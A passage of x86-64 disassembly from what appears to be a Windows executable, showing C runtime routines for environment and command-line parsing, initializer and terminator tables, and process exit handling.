   14000481e:	ff c8                	dec    %eax
   140004820:	48 89 1d 69 47 01 00 	mov    %rbx,0x14769(%rip)        # 0x140018f90
   140004827:	89 05 53 47 01 00    	mov    %eax,0x14753(%rip)        # 0x140018f80
   14000482d:	33 c9                	xor    %ecx,%ecx
   14000482f:	eb 69                	jmp    0x14000489a
   140004831:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140004835:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004839:	48 8b cb             	mov    %rbx,%rcx
   14000483c:	e8 53 24 00 00       	call   0x140006c94
   140004841:	8b f0                	mov    %eax,%esi
   140004843:	85 c0                	test   %eax,%eax
   140004845:	74 19                	je     0x140004860
   140004847:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000484b:	e8 dc 1d 00 00       	call   0x14000662c
   140004850:	48 8b cb             	mov    %rbx,%rcx
   140004853:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004857:	e8 d0 1d 00 00       	call   0x14000662c
   14000485c:	8b fe                	mov    %esi,%edi
   14000485e:	eb 3f                	jmp    0x14000489f
   140004860:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140004864:	48 8b cf             	mov    %rdi,%rcx
   140004867:	48 8b c2             	mov    %rdx,%rax
   14000486a:	48 39 3a             	cmp    %rdi,(%rdx)
   14000486d:	74 0c                	je     0x14000487b
   14000486f:	48 8d 40 08          	lea    0x8(%rax),%rax
   140004873:	48 ff c1             	inc    %rcx
   140004876:	48 39 38             	cmp    %rdi,(%rax)
   140004879:	75 f4                	jne    0x14000486f
   14000487b:	89 0d ff 46 01 00    	mov    %ecx,0x146ff(%rip)        # 0x140018f80
   140004881:	33 c9                	xor    %ecx,%ecx
   140004883:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004887:	48 89 15 02 47 01 00 	mov    %rdx,0x14702(%rip)        # 0x140018f90
   14000488e:	e8 99 1d 00 00       	call   0x14000662c
   140004893:	48 8b cb             	mov    %rbx,%rcx
   140004896:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   14000489a:	e8 8d 1d 00 00       	call   0x14000662c
   14000489f:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400048a4:	8b c7                	mov    %edi,%eax
   1400048a6:	48 83 c4 30          	add    $0x30,%rsp
   1400048aa:	41 5f                	pop    %r15
   1400048ac:	41 5e                	pop    %r14
   1400048ae:	5f                   	pop    %rdi
   1400048af:	5e                   	pop    %rsi
   1400048b0:	5d                   	pop    %rbp
   1400048b1:	c3                   	ret
   1400048b2:	cc                   	int3
   1400048b3:	cc                   	int3
   1400048b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048b9:	57                   	push   %rdi
   1400048ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400048be:	33 ff                	xor    %edi,%edi
   1400048c0:	48 39 3d 21 46 01 00 	cmp    %rdi,0x14621(%rip)        # 0x140018ee8
   1400048c7:	74 04                	je     0x1400048cd
   1400048c9:	33 c0                	xor    %eax,%eax
   1400048cb:	eb 4a                	jmp    0x140004917
   1400048cd:	e8 32 30 00 00       	call   0x140007904
   1400048d2:	48 8b d8             	mov    %rax,%rbx
   1400048d5:	48 85 c0             	test   %rax,%rax
   1400048d8:	75 0c                	jne    0x1400048e6
   1400048da:	33 c9                	xor    %ecx,%ecx
   1400048dc:	e8 4b 1d 00 00       	call   0x14000662c
   1400048e1:	83 c8 ff             	or     $0xffffffff,%eax
   1400048e4:	eb 31                	jmp    0x140004917
   1400048e6:	48 8b cb             	mov    %rbx,%rcx
   1400048e9:	e8 36 00 00 00       	call   0x140004924
   1400048ee:	48 85 c0             	test   %rax,%rax
   1400048f1:	75 05                	jne    0x1400048f8
   1400048f3:	83 cf ff             	or     $0xffffffff,%edi
   1400048f6:	eb 0e                	jmp    0x140004906
   1400048f8:	48 89 05 f1 45 01 00 	mov    %rax,0x145f1(%rip)        # 0x140018ef0
   1400048ff:	48 89 05 e2 45 01 00 	mov    %rax,0x145e2(%rip)        # 0x140018ee8
   140004906:	33 c9                	xor    %ecx,%ecx
   140004908:	e8 1f 1d 00 00       	call   0x14000662c
   14000490d:	48 8b cb             	mov    %rbx,%rcx
   140004910:	e8 17 1d 00 00       	call   0x14000662c
   140004915:	8b c7                	mov    %edi,%eax
   140004917:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000491c:	48 83 c4 20          	add    $0x20,%rsp
   140004920:	5f                   	pop    %rdi
   140004921:	c3                   	ret
   140004922:	cc                   	int3
   140004923:	cc                   	int3
   140004924:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004929:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000492e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004933:	57                   	push   %rdi
   140004934:	41 56                	push   %r14
   140004936:	41 57                	push   %r15
   140004938:	48 83 ec 30          	sub    $0x30,%rsp
   14000493c:	4c 8b f1             	mov    %rcx,%r14
   14000493f:	33 ed                	xor    %ebp,%ebp
   140004941:	8b cd                	mov    %ebp,%ecx
   140004943:	4d 8b c6             	mov    %r14,%r8
   140004946:	41 0f b7 16          	movzwl (%r14),%edx
   14000494a:	eb 29                	jmp    0x140004975
   14000494c:	66 83 fa 3d          	cmp    $0x3d,%dx
   140004950:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140004954:	48 0f 44 c1          	cmove  %rcx,%rax
   140004958:	48 8b c8             	mov    %rax,%rcx
   14000495b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000495f:	48 ff c0             	inc    %rax
   140004962:	66 41 39 2c 40       	cmp    %bp,(%r8,%rax,2)
   140004967:	75 f6                	jne    0x14000495f
   140004969:	4d 8d 04 40          	lea    (%r8,%rax,2),%r8
   14000496d:	49 83 c0 02          	add    $0x2,%r8
   140004971:	41 0f b7 10          	movzwl (%r8),%edx
   140004975:	66 85 d2             	test   %dx,%dx
   140004978:	75 d2                	jne    0x14000494c
   14000497a:	48 ff c1             	inc    %rcx
   14000497d:	ba 08 00 00 00       	mov    $0x8,%edx
   140004982:	e8 2d 1c 00 00       	call   0x1400065b4
   140004987:	48 8b d8             	mov    %rax,%rbx
   14000498a:	48 85 c0             	test   %rax,%rax
   14000498d:	75 0b                	jne    0x14000499a
   14000498f:	33 c9                	xor    %ecx,%ecx
   140004991:	e8 96 1c 00 00       	call   0x14000662c
   140004996:	33 c0                	xor    %eax,%eax
   140004998:	eb 79                	jmp    0x140004a13
   14000499a:	4c 8b fb             	mov    %rbx,%r15
   14000499d:	41 0f b7 06          	movzwl (%r14),%eax
   1400049a1:	66 85 c0             	test   %ax,%ax
   1400049a4:	74 63                	je     0x140004a09
   1400049a6:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   1400049aa:	48 ff c6             	inc    %rsi
   1400049ad:	66 41 39 2c 76       	cmp    %bp,(%r14,%rsi,2)
   1400049b2:	75 f6                	jne    0x1400049aa
   1400049b4:	48 ff c6             	inc    %rsi
   1400049b7:	66 83 f8 3d          	cmp    $0x3d,%ax
   1400049bb:	74 35                	je     0x1400049f2
   1400049bd:	ba 02 00 00 00       	mov    $0x2,%edx
   1400049c2:	48 8b ce             	mov    %rsi,%rcx
   1400049c5:	e8 ea 1b 00 00       	call   0x1400065b4
   1400049ca:	48 8b f8             	mov    %rax,%rdi
   1400049cd:	48 85 c0             	test   %rax,%rax
   1400049d0:	74 26                	je     0x1400049f8
   1400049d2:	4d 8b c6             	mov    %r14,%r8
   1400049d5:	48 8b d6             	mov    %rsi,%rdx
   1400049d8:	48 8b c8             	mov    %rax,%rcx
   1400049db:	e8 c4 19 00 00       	call   0x1400063a4
   1400049e0:	33 c9                	xor    %ecx,%ecx
   1400049e2:	85 c0                	test   %eax,%eax
   1400049e4:	75 46                	jne    0x140004a2c
   1400049e6:	49 89 3f             	mov    %rdi,(%r15)
   1400049e9:	49 83 c7 08          	add    $0x8,%r15
   1400049ed:	e8 3a 1c 00 00       	call   0x14000662c
   1400049f2:	4d 8d 34 76          	lea    (%r14,%rsi,2),%r14
   1400049f6:	eb a5                	jmp    0x14000499d
   1400049f8:	48 8b cb             	mov    %rbx,%rcx
   1400049fb:	e8 40 00 00 00       	call   0x140004a40
   140004a00:	33 c9                	xor    %ecx,%ecx
   140004a02:	e8 25 1c 00 00       	call   0x14000662c
   140004a07:	eb 86                	jmp    0x14000498f
   140004a09:	33 c9                	xor    %ecx,%ecx
   140004a0b:	e8 1c 1c 00 00       	call   0x14000662c
   140004a10:	48 8b c3             	mov    %rbx,%rax
   140004a13:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004a18:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004a1d:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004a22:	48 83 c4 30          	add    $0x30,%rsp
   140004a26:	41 5f                	pop    %r15
   140004a28:	41 5e                	pop    %r14
   140004a2a:	5f                   	pop    %rdi
   140004a2b:	c3                   	ret
   140004a2c:	45 33 c9             	xor    %r9d,%r9d
   140004a2f:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004a34:	45 33 c0             	xor    %r8d,%r8d
   140004a37:	33 d2                	xor    %edx,%edx
   140004a39:	e8 1e 19 00 00       	call   0x14000635c
   140004a3e:	cc                   	int3
   140004a3f:	cc                   	int3
   140004a40:	48 85 c9             	test   %rcx,%rcx
   140004a43:	74 3b                	je     0x140004a80
   140004a45:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a4a:	57                   	push   %rdi
   140004a4b:	48 83 ec 20          	sub    $0x20,%rsp
   140004a4f:	48 8b 01             	mov    (%rcx),%rax
   140004a52:	48 8b d9             	mov    %rcx,%rbx
   140004a55:	48 8b f9             	mov    %rcx,%rdi
   140004a58:	eb 0f                	jmp    0x140004a69
   140004a5a:	48 8b c8             	mov    %rax,%rcx
   140004a5d:	e8 ca 1b 00 00       	call   0x14000662c
   140004a62:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140004a66:	48 8b 07             	mov    (%rdi),%rax
   140004a69:	48 85 c0             	test   %rax,%rax
   140004a6c:	75 ec                	jne    0x140004a5a
   140004a6e:	48 8b cb             	mov    %rbx,%rcx
   140004a71:	e8 b6 1b 00 00       	call   0x14000662c
   140004a76:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a7b:	48 83 c4 20          	add    $0x20,%rsp
   140004a7f:	5f                   	pop    %rdi
   140004a80:	c3                   	ret
   140004a81:	cc                   	int3
   140004a82:	cc                   	int3
   140004a83:	cc                   	int3
   140004a84:	48 83 ec 28          	sub    $0x28,%rsp
   140004a88:	48 8b 09             	mov    (%rcx),%rcx
   140004a8b:	48 3b 0d 66 44 01 00 	cmp    0x14466(%rip),%rcx        # 0x140018ef8
   140004a92:	74 05                	je     0x140004a99
   140004a94:	e8 a7 ff ff ff       	call   0x140004a40
   140004a99:	48 83 c4 28          	add    $0x28,%rsp
   140004a9d:	c3                   	ret
   140004a9e:	cc                   	int3
   140004a9f:	cc                   	int3
   140004aa0:	48 83 ec 28          	sub    $0x28,%rsp
   140004aa4:	48 8b 09             	mov    (%rcx),%rcx
   140004aa7:	48 3b 0d 42 44 01 00 	cmp    0x14442(%rip),%rcx        # 0x140018ef0
   140004aae:	74 05                	je     0x140004ab5
   140004ab0:	e8 8b ff ff ff       	call   0x140004a40
   140004ab5:	48 83 c4 28          	add    $0x28,%rsp
   140004ab9:	c3                   	ret
   140004aba:	cc                   	int3
   140004abb:	cc                   	int3
   140004abc:	48 83 ec 38          	sub    $0x38,%rsp
   140004ac0:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140004ac7:	ff ff 
   140004ac9:	48 8d 0d 10 44 01 00 	lea    0x14410(%rip),%rcx        # 0x140018ee0
   140004ad0:	e8 af ff ff ff       	call   0x140004a84
   140004ad5:	90                   	nop
   140004ad6:	48 8d 0d 0b 44 01 00 	lea    0x1440b(%rip),%rcx        # 0x140018ee8
   140004add:	e8 be ff ff ff       	call   0x140004aa0
   140004ae2:	90                   	nop
   140004ae3:	48 8b 0d 0e 44 01 00 	mov    0x1440e(%rip),%rcx        # 0x140018ef8
   140004aea:	e8 51 ff ff ff       	call   0x140004a40
   140004aef:	48 8b 0d fa 43 01 00 	mov    0x143fa(%rip),%rcx        # 0x140018ef0
   140004af6:	48 83 c4 38          	add    $0x38,%rsp
   140004afa:	e9 41 ff ff ff       	jmp    0x140004a40
   140004aff:	cc                   	int3
   140004b00:	e9 af fd ff ff       	jmp    0x1400048b4
   140004b05:	cc                   	int3
   140004b06:	cc                   	int3
   140004b07:	cc                   	int3
   140004b08:	48 8b 05 91 44 01 00 	mov    0x14491(%rip),%rax        # 0x140018fa0
   140004b0f:	48 8d 0d ea 43 01 00 	lea    0x143ea(%rip),%rcx        # 0x140018f00
   140004b16:	45 33 c0             	xor    %r8d,%r8d
   140004b19:	48 85 c0             	test   %rax,%rax
   140004b1c:	41 8a d0             	mov    %r8b,%dl
   140004b1f:	48 0f 45 c8          	cmovne %rax,%rcx
   140004b23:	0f b7 01             	movzwl (%rcx),%eax
   140004b26:	66 83 f8 20          	cmp    $0x20,%ax
   140004b2a:	77 09                	ja     0x140004b35
   140004b2c:	66 85 c0             	test   %ax,%ax
   140004b2f:	74 27                	je     0x140004b58
   140004b31:	84 d2                	test   %dl,%dl
   140004b33:	74 11                	je     0x140004b46
   140004b35:	66 83 f8 22          	cmp    $0x22,%ax
   140004b39:	75 05                	jne    0x140004b40
   140004b3b:	84 d2                	test   %dl,%dl
   140004b3d:	0f 94 c2             	sete   %dl
   140004b40:	48 83 c1 02          	add    $0x2,%rcx
   140004b44:	eb dd                	jmp    0x140004b23
   140004b46:	66 83 f8 20          	cmp    $0x20,%ax
   140004b4a:	77 0c                	ja     0x140004b58
   140004b4c:	48 83 c1 02          	add    $0x2,%rcx
   140004b50:	0f b7 01             	movzwl (%rcx),%eax
   140004b53:	66 85 c0             	test   %ax,%ax
   140004b56:	75 ee                	jne    0x140004b46
   140004b58:	48 8b c1             	mov    %rcx,%rax
   140004b5b:	c3                   	ret
   140004b5c:	48 3b ca             	cmp    %rdx,%rcx
   140004b5f:	74 3b                	je     0x140004b9c
   140004b61:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b66:	57                   	push   %rdi
   140004b67:	48 83 ec 20          	sub    $0x20,%rsp
   140004b6b:	48 8b fa             	mov    %rdx,%rdi
   140004b6e:	48 8b d9             	mov    %rcx,%rbx
   140004b71:	48 8b 03             	mov    (%rbx),%rax
   140004b74:	48 85 c0             	test   %rax,%rax
   140004b77:	74 10                	je     0x140004b89
   140004b79:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140004b80:	3e f1 85 
   140004b83:	ff 15 df 96 00 00    	call   *0x96df(%rip)        # 0x14000e268
   140004b89:	48 83 c3 08          	add    $0x8,%rbx
   140004b8d:	48 3b df             	cmp    %rdi,%rbx
   140004b90:	75 df                	jne    0x140004b71
   140004b92:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004b97:	48 83 c4 20          	add    $0x20,%rsp
   140004b9b:	5f                   	pop    %rdi
   140004b9c:	c3                   	ret
   140004b9d:	cc                   	int3
   140004b9e:	cc                   	int3
   140004b9f:	cc                   	int3
   140004ba0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ba5:	57                   	push   %rdi
   140004ba6:	48 83 ec 20          	sub    $0x20,%rsp
   140004baa:	48 8b fa             	mov    %rdx,%rdi
   140004bad:	48 8b d9             	mov    %rcx,%rbx
   140004bb0:	48 3b ca             	cmp    %rdx,%rcx
   140004bb3:	74 25                	je     0x140004bda
   140004bb5:	48 8b 03             	mov    (%rbx),%rax
   140004bb8:	48 85 c0             	test   %rax,%rax
   140004bbb:	74 14                	je     0x140004bd1
   140004bbd:	49 ba 70 30 52 5e 47 	movabs $0xd30527475e523070,%r10
   140004bc4:	27 05 d3 
   140004bc7:	ff 15 9b 96 00 00    	call   *0x969b(%rip)        # 0x14000e268
   140004bcd:	85 c0                	test   %eax,%eax
   140004bcf:	75 0b                	jne    0x140004bdc
   140004bd1:	48 83 c3 08          	add    $0x8,%rbx
   140004bd5:	48 3b df             	cmp    %rdi,%rbx
   140004bd8:	eb d9                	jmp    0x140004bb3
   140004bda:	33 c0                	xor    %eax,%eax
   140004bdc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004be1:	48 83 c4 20          	add    $0x20,%rsp
   140004be5:	5f                   	pop    %rdi
   140004be6:	c3                   	ret
   140004be7:	cc                   	int3
   140004be8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004bed:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004bf2:	57                   	push   %rdi
   140004bf3:	48 83 ec 20          	sub    $0x20,%rsp
   140004bf7:	49 8b d9             	mov    %r9,%rbx
   140004bfa:	49 8b f8             	mov    %r8,%rdi
   140004bfd:	8b 0a                	mov    (%rdx),%ecx
   140004bff:	e8 e4 2d 00 00       	call   0x1400079e8
   140004c04:	90                   	nop
   140004c05:	48 8b cf             	mov    %rdi,%rcx
   140004c08:	e8 13 00 00 00       	call   0x140004c20
   140004c0d:	90                   	nop
   140004c0e:	8b 0b                	mov    (%rbx),%ecx
   140004c10:	e8 27 2e 00 00       	call   0x140007a3c
   140004c15:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004c1a:	48 83 c4 20          	add    $0x20,%rsp
   140004c1e:	5f                   	pop    %rdi
   140004c1f:	c3                   	ret
   140004c20:	40 53                	rex push %rbx
   140004c22:	48 83 ec 30          	sub    $0x30,%rsp
   140004c26:	48 8b d9             	mov    %rcx,%rbx
   140004c29:	80 3d e0 42 01 00 00 	cmpb   $0x0,0x142e0(%rip)        # 0x140018f10
   140004c30:	0f 85 a9 00 00 00    	jne    0x140004cdf
   140004c36:	b8 01 00 00 00       	mov    $0x1,%eax
   140004c3b:	87 05 c3 42 01 00    	xchg   %eax,0x142c3(%rip)        # 0x140018f04
   140004c41:	48 8b 01             	mov    (%rcx),%rax
   140004c44:	8b 08                	mov    (%rax),%ecx
   140004c46:	85 c9                	test   %ecx,%ecx
   140004c48:	75 3e                	jne    0x140004c88
   140004c4a:	48 8b 05 ef 33 01 00 	mov    0x133ef(%rip),%rax        # 0x140018040
   140004c51:	48 8b 15 b0 42 01 00 	mov    0x142b0(%rip),%rdx        # 0x140018f08
   140004c58:	48 3b d0             	cmp    %rax,%rdx
   140004c5b:	74 22                	je     0x140004c7f
   140004c5d:	8b c8                	mov    %eax,%ecx
   140004c5f:	83 e1 3f             	and    $0x3f,%ecx
   140004c62:	48 33 c2             	xor    %rdx,%rax
   140004c65:	48 d3 c8             	ror    %cl,%rax
   140004c68:	49 ba 70 28 d9 78 45 	movabs $0x99012e4578d92870,%r10
   140004c6f:	2e 01 99 
   140004c72:	45 33 c0             	xor    %r8d,%r8d
   140004c75:	33 d2                	xor    %edx,%edx
   140004c77:	33 c9                	xor    %ecx,%ecx
   140004c79:	ff 15 e9 95 00 00    	call   *0x95e9(%rip)        # 0x14000e268
   140004c7f:	48 8d 0d 9a 42 01 00 	lea    0x1429a(%rip),%rcx        # 0x140018f20
   140004c86:	eb 0c                	jmp    0x140004c94
   140004c88:	83 f9 01             	cmp    $0x1,%ecx
   140004c8b:	75 0d                	jne    0x140004c9a
   140004c8d:	48 8d 0d a4 42 01 00 	lea    0x142a4(%rip),%rcx        # 0x140018f38
   140004c94:	e8 5b 07 00 00       	call   0x1400053f4
   140004c99:	90                   	nop
   140004c9a:	48 8b 03             	mov    (%rbx),%rax
   140004c9d:	83 38 00             	cmpl   $0x0,(%rax)
   140004ca0:	75 13                	jne    0x140004cb5
   140004ca2:	48 8d 15 57 96 00 00 	lea    0x9657(%rip),%rdx        # 0x14000e300
   140004ca9:	48 8d 0d 30 96 00 00 	lea    0x9630(%rip),%rcx        # 0x14000e2e0
   140004cb0:	e8 a7 fe ff ff       	call   0x140004b5c
   140004cb5:	48 8d 15 54 96 00 00 	lea    0x9654(%rip),%rdx        # 0x14000e310
   140004cbc:	48 8d 0d 45 96 00 00 	lea    0x9645(%rip),%rcx        # 0x14000e308
   140004cc3:	e8 94 fe ff ff       	call   0x140004b5c
   140004cc8:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004ccc:	83 38 00             	cmpl   $0x0,(%rax)
   140004ccf:	75 0e                	jne    0x140004cdf
   140004cd1:	c6 05 38 42 01 00 01 	movb   $0x1,0x14238(%rip)        # 0x140018f10
   140004cd8:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004cdc:	c6 00 01             	movb   $0x1,(%rax)
   140004cdf:	48 83 c4 30          	add    $0x30,%rsp
   140004ce3:	5b                   	pop    %rbx
   140004ce4:	c3                   	ret
   140004ce5:	e8 36 09 00 00       	call   0x140005620
   140004cea:	90                   	nop
   140004ceb:	cc                   	int3
   140004cec:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140004cf1:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140004cf5:	55                   	push   %rbp
   140004cf6:	48 8b ec             	mov    %rsp,%rbp
   140004cf9:	48 83 ec 50          	sub    $0x50,%rsp
   140004cfd:	48 c7 45 e0 fe ff ff 	movq   $0xfffffffffffffffe,-0x20(%rbp)
   140004d04:	ff 
   140004d05:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140004d0a:	8b d9                	mov    %ecx,%ebx
   140004d0c:	45 85 c0             	test   %r8d,%r8d
   140004d0f:	75 4a                	jne    0x140004d5b
   140004d11:	33 c9                	xor    %ecx,%ecx
   140004d13:	ff 15 5f 93 00 00    	call   *0x935f(%rip)        # 0x14000e078
   140004d19:	48 85 c0             	test   %rax,%rax
   140004d1c:	74 3d                	je     0x140004d5b
   140004d1e:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140004d23:	66 39 08             	cmp    %cx,(%rax)
   140004d26:	75 33                	jne    0x140004d5b
   140004d28:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140004d2c:	48 03 c8             	add    %rax,%rcx
   140004d2f:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140004d35:	75 24                	jne    0x140004d5b
   140004d37:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140004d3c:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140004d40:	75 19                	jne    0x140004d5b
   140004d42:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140004d49:	76 10                	jbe    0x140004d5b
   140004d4b:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140004d52:	74 07                	je     0x140004d5b
   140004d54:	8b cb                	mov    %ebx,%ecx
   140004d56:	e8 bd 00 00 00       	call   0x140004e18
   140004d5b:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   140004d5f:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140004d63:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004d67:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140004d6b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004d6f:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140004d73:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140004d77:	b8 02 00 00 00       	mov    $0x2,%eax
   140004d7c:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140004d7f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   140004d82:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   140004d86:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004d8a:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140004d8e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004d92:	e8 51 fe ff ff       	call   0x140004be8
   140004d97:	90                   	nop
   140004d98:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004d9c:	74 0b                	je     0x140004da9
   140004d9e:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004da3:	48 83 c4 50          	add    $0x50,%rsp
   140004da7:	5d                   	pop    %rbp
   140004da8:	c3                   	ret
   140004da9:	8b cb                	mov    %ebx,%ecx
   140004dab:	e8 04 00 00 00       	call   0x140004db4
   140004db0:	cc                   	int3
   140004db1:	cc                   	int3
   140004db2:	cc                   	int3
   140004db3:	cc                   	int3
   140004db4:	40 53                	rex push %rbx
   140004db6:	48 83 ec 20          	sub    $0x20,%rsp
   140004dba:	8b d9                	mov    %ecx,%ebx
   140004dbc:	e8 27 00 00 00       	call   0x140004de8
   140004dc1:	84 c0                	test   %al,%al
   140004dc3:	74 11                	je     0x140004dd6
   140004dc5:	ff 15 5d 93 00 00    	call   *0x935d(%rip)        # 0x14000e128
   140004dcb:	48 8b c8             	mov    %rax,%rcx
   140004dce:	8b d3                	mov    %ebx,%edx
   140004dd0:	ff 15 62 93 00 00    	call   *0x9362(%rip)        # 0x14000e138
   140004dd6:	8b cb                	mov    %ebx,%ecx
   140004dd8:	e8 3b 00 00 00       	call   0x140004e18
   140004ddd:	8b cb                	mov    %ebx,%ecx
   140004ddf:	ff 15 4b 93 00 00    	call   *0x934b(%rip)        # 0x14000e130
   140004de5:	cc                   	int3
   140004de6:	cc                   	int3
   140004de7:	cc                   	int3
   140004de8:	48 83 ec 28          	sub    $0x28,%rsp
   140004dec:	e8 67 2c 00 00       	call   0x140007a58
   140004df1:	83 f8 01             	cmp    $0x1,%eax
   140004df4:	74 1b                	je     0x140004e11
   140004df6:	65 48 8b 0c 25 60 00 	mov    %gs:0x60,%rcx
   140004dfd:	00 00 
   140004dff:	8b 91 bc 00 00 00    	mov    0xbc(%rcx),%edx
   140004e05:	c1 ea 08             	shr    $0x8,%edx
   140004e08:	f6 c2 01             	test   $0x1,%dl
   140004e0b:	75 04                	jne    0x140004e11
   140004e0d:	b0 01                	mov    $0x1,%al
   140004e0f:	eb 02                	jmp    0x140004e13
   140004e11:	32 c0                	xor    %al,%al
   140004e13:	48 83 c4 28          	add    $0x28,%rsp
   140004e17:	c3                   	ret
   140004e18:	40 53                	rex push %rbx
   140004e1a:	48 83 ec 30          	sub    $0x30,%rsp
   140004e1e:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140004e25:	ff ff 
   140004e27:	8b d9                	mov    %ecx,%ebx
   140004e29:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140004e2f:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140004e34:	48 8d 15 85 a6 00 00 	lea    0xa685(%rip),%rdx        # 0x14000f4c0
   140004e3b:	33 c9                	xor    %ecx,%ecx
   140004e3d:	ff 15 fd 92 00 00    	call   *0x92fd(%rip)        # 0x14000e140
   140004e43:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140004e48:	85 c0                	test   %eax,%eax
   140004e4a:	74 29                	je     0x140004e75
   140004e4c:	48 8d 15 85 a6 00 00 	lea    0xa685(%rip),%rdx        # 0x14000f4d8
   140004e53:	ff 15 8f 92 00 00    	call   *0x928f(%rip)        # 0x14000e0e8
   140004e59:	48 85 c0             	test   %rax,%rax
   140004e5c:	74 12                	je     0x140004e70
   140004e5e:	49 ba 70 7b 5a 5e 9b 	movabs $0xa201879b5e5a7b70,%r10
   140004e65:	87 01 a2 
   140004e68:	8b cb                	mov    %ebx,%ecx
   140004e6a:	ff 15 f8 93 00 00    	call   *0x93f8(%rip)        # 0x14000e268
   140004e70:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140004e75:	48 85 c9             	test   %rcx,%rcx
   140004e78:	74 07                	je     0x140004e81
   140004e7a:	ff 15 60 92 00 00    	call   *0x9260(%rip)        # 0x14000e0e0
   140004e80:	90                   	nop
   140004e81:	48 83 c4 30          	add    $0x30,%rsp
   140004e85:	5b                   	pop    %rbx
   140004e86:	c3                   	ret
   140004e87:	cc                   	int3
   140004e88:	48 89 0d 79 40 01 00 	mov    %rcx,0x14079(%rip)        # 0x140018f08
   140004e8f:	c3                   	ret
   140004e90:	ba 02 00 00 00       	mov    $0x2,%edx
   140004e95:	33 c9                	xor    %ecx,%ecx
   140004e97:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   140004e9b:	e9 4c fe ff ff       	jmp    0x140004cec
   140004ea0:	33 d2                	xor    %edx,%edx
   140004ea2:	33 c9                	xor    %ecx,%ecx
   140004ea4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140004ea8:	e9 3f fe ff ff       	jmp    0x140004cec
   140004ead:	cc                   	int3
   140004eae:	cc                   	int3
   140004eaf:	cc                   	int3
   140004eb0:	45 33 c0             	xor    %r8d,%r8d
   140004eb3:	41 8d 50 02          	lea    0x2(%r8),%edx
   140004eb7:	e9 30 fe ff ff       	jmp    0x140004cec
   140004ebc:	48 83 ec 28          	sub    $0x28,%rsp
   140004ec0:	4c 8b 05 79 31 01 00 	mov    0x13179(%rip),%r8        # 0x140018040
   140004ec7:	48 8b d1             	mov    %rcx,%rdx
   140004eca:	4c 39 05 37 40 01 00 	cmp    %r8,0x14037(%rip)        # 0x140018f08
   140004ed1:	75 21                	jne    0x140004ef4
   140004ed3:	41 8b c8             	mov    %r8d,%ecx
   140004ed6:	b8 40 00 00 00       	mov    $0x40,%eax
   140004edb:	83 e1 3f             	and    $0x3f,%ecx
   140004ede:	2b c1                	sub    %ecx,%eax
   140004ee0:	8a c8                	mov    %al,%cl
   140004ee2:	48 d3 ca             	ror    %cl,%rdx
   140004ee5:	49 33 d0             	xor    %r8,%rdx
